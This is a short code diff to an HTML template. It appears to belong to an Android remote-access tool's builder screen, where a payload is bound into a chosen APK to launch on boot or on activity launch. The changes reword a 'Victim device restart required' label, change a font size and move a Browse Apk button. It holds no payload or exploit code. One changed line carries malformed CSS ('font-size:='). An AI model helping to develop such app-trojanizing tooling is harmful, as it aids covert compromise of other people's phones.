@@ -99,20 +99,18 @@
                     <div class="ui radio checkbox">
                         <input type="radio" name="method" checked="checked" ng-model="bindApk.method" value="BOOT">
                         <label>On boot (recommended)</label>
-                        <span style="font-size: 10px ;color: red">Victim needs to restart his phone</span>
+                        <span style="font-size:= 10px ;color: red">Victim device restart required</span>
                     </div>
                 </td>
+                <td>
+                    <button ng-click="BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button "><i class="folder open icon" ></i>Browse Apk</button>
+                    </td>
                 <td>
                     <div class="ui radio checkbox">
                         <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
                         <label>On launcher activity</label>
-                        <span style="font-size: 10px ;color: red">Unstable (doesn't work on all apps)</span>
+                        <span style="font-size: 14px ;color: red">Unstable (doesn't work on all apps)</span>
                     </div>
-                </td>
-
-                <td>
-                    <button ng-click="BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button "><i class="folder open icon" ></i>Browse Apk</button>
-
                 </td>
         </tbody>
         <tfoot class="half-width">
